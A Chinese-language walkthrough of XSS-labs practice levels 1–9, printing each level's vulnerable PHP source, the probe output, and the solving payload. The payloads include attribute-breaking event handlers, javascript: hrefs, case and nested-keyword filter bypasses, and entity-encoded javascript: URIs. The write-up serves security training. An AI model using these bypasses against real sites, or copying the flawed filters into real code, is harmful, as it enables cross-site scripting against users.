# 

# XSS-labs靶场实战

> 每关的答案会用***加粗斜体显示***，方便后续快速查看。
>
> 如果写的不好请见谅！

​	

## 第一关

![](https://pic.imgdb.cn/item/64c86a521ddac507cc2aab8f.jpg)

### 源码

```php+HTML
<body>
<h1 align=center>欢迎来到level1</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["name"];
echo "<h2 align=center>欢迎用户".$str."</h2>";
?>
<center><img src=level1.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
</body>
```

### 过程(未知源码的情况下)

***地址栏提交参数值：`<script>alert(1)</script>`，过关。***

​	

​	

## 第二关

![](https://pic.imgdb.cn/item/64c86e881ddac507cc33c105.jpg)

### 源码

```php+HTML
<body>
<h1 align=center>欢迎来到level2</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level2.php method=GET>
<input name=keyword  value="'.$str.'">
<input type=submit name=submit value="搜索"/>
</form>
</center>';
?>
<center><img src=level2.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
</body>
```

### 过程(未知源码的情况下)

表单输入`<sCr<scrscRiptipt>ipt>OonN\&apos;\"'<>`查看前端代码：

```html
<body>
<h1 align=center>欢迎来到level2</h1>
<h2 align=center>没有找到和&lt;sCr&lt;scrscRiptipt&gt;ipt&gt;OonN\&amp;apos;\&quot;'&lt;&gt;相关的结果.</h2><center>
<form action=level2.php method=GET>
<input name=keyword  value="<sCr<scrscRiptipt>ipt>OonN\&apos;\"'<>">
<input type=submit name=submit value="搜索"/>
</form>
</center><center><img src=level2.png></center>
<h3 align=center>payload的长度:37</h3></body>
```

有两处输出(第3行、第5行)，第3行的输出有被转义过，推测是用到了`htmlspecialchars()`；第5行的输出没被处理，作为payload的构造基础。

***表单输入`"><script>alert(1)</script>`，过关。***

​	

​	

## 第三关

![](https://pic.imgdb.cn/item/64c875ab1ddac507cc449adf.jpg)

### 源码

```php+HTML
<body>
<h1 align=center>欢迎来到level3</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>"."<center>
<form action=level3.php method=GET>
<input name=keyword  value='".htmlspecialchars($str)."'>
<input type=submit name=submit value=搜索 />
</form>
</center>";
?>
<center><img src=level3.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
</body>
```

### 过程(未知源码的情况下)

表单输入`<sCr<scrscRiptipt>ipt>OonN\&apos;\"'<>`查看前端代码：

```html
<body>
<h1 align=center>欢迎来到level3</h1>
<h2 align=center>没有找到和&lt;sCr&lt;scrscRiptipt&gt;ipt&gt;OonN\&amp;apos;\&quot;'&lt;&gt;相关的结果.</h2><center>
<form action=level3.php method=GET>
<input name=keyword  value='&lt;sCr&lt;scrscRiptipt&gt;ipt&gt;OonN\&amp;apos;\&quot;'&lt;&gt;'>
<input type=submit name=submit value=搜索 />
</form>
</center><center><img src=level3.png></center>
<h3 align=center>payload的长度:37</h3></body>
```

有两处输出(第3行、第5行)，这两处的输出都被处理过，推测是用到了`htmlspecialchars()`，但是没有加`ENT_QUOTES`参数导致`'`没有被处理，将第5行的输出作为构造payload的基础。

***表单输入`'onmouseover='javascript:alert(1)`，鼠标移到表单上，过关。***

​	

​	

## 第四关

![](https://pic.imgdb.cn/item/64c87b6f1ddac507cc53adb8.jpg)

### 源码

```php+HTML
<body>
<h1 align=center>欢迎来到level4</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str2=str_replace(">","",$str);
$str3=str_replace("<","",$str2);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level4.php method=GET>
<input name=keyword  value="'.$str3.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
<center><img src=level4.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str3)."</h3>";
?>
</body>
```

### 过程(未知源码的情况下)

表单输入`<sCr<scrscRiptipt>ipt>OonN\&apos;\"'<>`查看前端代码：

```html
<body>
<h1 align=center>欢迎来到level4</h1>
<h2 align=center>没有找到和&lt;sCr&lt;scrscRiptipt&gt;ipt&gt;OonN\&amp;apos;\&quot;'&lt;&gt;相关的结果.</h2><center>
<form action=level4.php method=GET>
<input name=keyword  value="sCrscrscRiptiptiptOonN\&apos;\"'">
<input type=submit name=submit value=搜索 />
</form>
</center><center><img src=level4.png></center>
<h3 align=center>payload的长度:32</h3></body>
```

有两处输出(第3行、第5行)，这两处的输出都被处理过，第3行的处理可能是用了`htmlspecialchars()`，虽然没处理`'`但也没法利用。第5行处理了`<`和`>`，将第5行的输出作为构造payload的基础。

***表单输入`"onmouseover="javascript:alert(1)`，鼠标移到表单上，过关。***

​	

​	

## 第五关

![](https://pic.imgdb.cn/item/64c880331ddac507cc5d4373.jpg)

### 源码

```php+HTML
<body>
<h1 align=center>欢迎来到level5</h1>
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level5.php method=GET>
<input name=keyword  value="'.$str3.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
<center><img src=level5.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str3)."</h3>";
?>
</body>
```

### 过程(未知源码的情况下)

表单输入`<sCr<scrscRiptipt>ipt>OonN\&apos;\"'<>`查看前端代码：

```html
<h2 align=center>没有找到和&lt;scr&lt;scrscriptipt&gt;ipt&gt;oonn\&amp;apos;\&quot;'&lt;&gt;相关的结果.</h2><center>
<form action=level5.php method=GET>
<input name=keyword  value="<scr<scrscriptipt>ipt>oo_nn\&apos;\"'<>">
<input type=submit name=submit value=搜索 />
</form>
```

有两处输出(第1行、第3行)，这两处的输出都被处理过，推测第1行的处理用了`htmlspecialchars()`，第3行将`on`替换成`o_n`，将第5行的输出作为构造payload的基础。

表单输入`<script>alert(1)</script>`查看前端代码：

```html
<input name=keyword  value="<scr_ipt>alert(1)</script>">
```

推测不仅将`on`替换成`o_n`，还将`<script>`替换成`<scr_ipt>`。

***构造 payload ——`" ><a href = "javascript:alert(1)" >click</a>`，点击按钮，过关。***

​	

​	

## 第六关

![](https://pic.imgdb.cn/item/64c88fd71ddac507cc773c36.jpg)

### 源码

```php+HTML
<body>
<h1 align=center>欢迎来到level6</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level6.php method=GET>
<input name=keyword  value="'.$str6.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
<center><img src=level6.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str6)."</h3>";
?>
</body>
```

### 过程(未知源码的情况下)

与上一关一样，推测不仅将`on`替换成`o_n`，还将`<script>`替换成`<scr_ipt>`。

用上一关的payload——`" ><a href = "javascript:alert(1)" >click</a>`，发现`href`也被处理成`hr_ef`。

***尝试换成大写的`hREf`——`" ><a hREf = "javascript:alert(1)" >click</a>`，过关。***

​	

​	

## 第七关

![](https://pic.imgdb.cn/item/64c8927f1ddac507cc7c3a7a.jpg)

### 源码

```php+HTML
<body>
<h1 align=center>欢迎来到level7</h1>
<?php 
ini_set("display_errors", 0);
$str =strtolower( $_GET["keyword"]);
$str2=str_replace("script","",$str);
$str3=str_replace("on","",$str2);
$str4=str_replace("src","",$str3);
$str5=str_replace("data","",$str4);
$str6=str_replace("href","",$str5);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level7.php method=GET>
<input name=keyword  value="'.$str6.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
<center><img src=level7.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str6)."</h3>";
?>
</body>
```

### 过程(未知源码的情况下)

表单输入`<sCr<scrscRiptipt>ipt>OonN\&apos;\"'<>`查看前端代码：

```html
<input name=keyword  value="<scr<script>ipt>on\&apos;\"'<>">
```

推测将`script`和`on`删了。

***构造payload：`"><scrscriptipt>alert(1)</scrscriptipt>`，过关。***

​	

​	

## 第八关

![](https://pic.imgdb.cn/item/64c8948b1ddac507cc80558d.jpg)

### 源码

```php+HTML
<body>
<h1 align=center>欢迎来到level8</h1>
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
$str7=str_replace('"','&quot',$str6);
echo '<center>
<form action=level8.php method=GET>
<input name=keyword  value="'.htmlspecialchars($str).'">
<input type=submit name=submit value=添加友情链接 />
</form>
</center>';
?>
<?php
 echo '<center><BR><a href="'.$str7.'">友情链接</a></center>';
?>
<center><img src=level8.jpg></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str7)."</h3>";
?>
</body>
```

### 过程(未知源码的情况下)

表单输入`<sCr<scrscRiptipt>ipt>OonN\&apos;\"'<>`查看前端代码：

```html
<input name=keyword  value="&lt;scr&lt;scrscriptipt&gt;ipt&gt;oonn\&amp;apos;\&quot;'&lt;&gt;">
<input type=submit name=submit value=添加友情链接 />
</form>
</center><center><BR><a href="<scr<scrscr_iptipt>ipt>oo_nn\&apos;\&quot'<>">友情链接</a></center><center><img src=level8.jpg></center>
```

第1行用了`htmlspecialchars()`，没法注入payload。

第4行貌似是将`on`替换成`o_n`，构建payload：`javascript:alert(1)`，查看前端代码：

```html
</center><center><BR><a href="javascr_ipt:alert(1)">友情链接</a></center><center><img src=level8.jpg></center>
```

可见将`script`替换成`scr_ipt`。

***将payload进行 Unicode编码——`&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;`，过关。***

​	

​	

## 第九关

![](https://pic.imgdb.cn/item/64c8c15e1ddac507ccd8f63c.jpg)

### 源码

```php+HTML
<body>
<h1 align=center>欢迎来到level9</h1>
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
$str7=str_replace('"','&quot',$str6);
echo '<center>
<form action=level9.php method=GET>
<input name=keyword  value="'.htmlspecialchars($str).'">
<input type=submit name=submit value=添加友情链接 />
</form>
</center>';
?>
<?php
if(false===strpos($str7,'http://'))
{
  echo '<center><BR><a href="您的链接不合法？有没有！">友情链接</a></center>';
        }
else
{
  echo '<center><BR><a href="'.$str7.'">友情链接</a></center>';
}
?>
<center><img src=level9.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str7)."</h3>";
?>
</body>
```

### 过程(未知源码的情况下)

表单输入`<sCr<scrscRiptipt>ipt>OonN\&apos;\"'<>`查看前端代码：

```html
<input name=keyword  value="&lt;scr&lt;scrscriptipt&gt;ipt&gt;oonn\&amp;apos;\&quot;'&lt;&gt;">
<input type=submit name=submit value=添加友情链接 />
</form>
</center><center><BR><a href="您的链接不合法？有没有！">友情链接</a></center><center><img src=level9.png></center>
```

第1个输出点用了`htmlspecialchars()`，没法构造payload。

第2个输出点直接把输入的内容替换成报错信息(╬▔皿▔)╯，所以从前端没法猜测过滤机制，要么乱试要么看源码。

```php
<?php
if(false===strpos($str7,'http://'))
{
  echo '<center><BR><a href="您的链接不合法？有没有！">友情链接</a></center>';
        }
else
{
  echo '<center><BR><a href="'.$str7.'">友情链接</a></center>';
}
?>
```

由此可知过滤机制相比于上一关多了个判断输入的内容有没有包含`http://`。

***构建 payload：`&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;/*http://*/`，过关。***

​	

​	

## 第十关


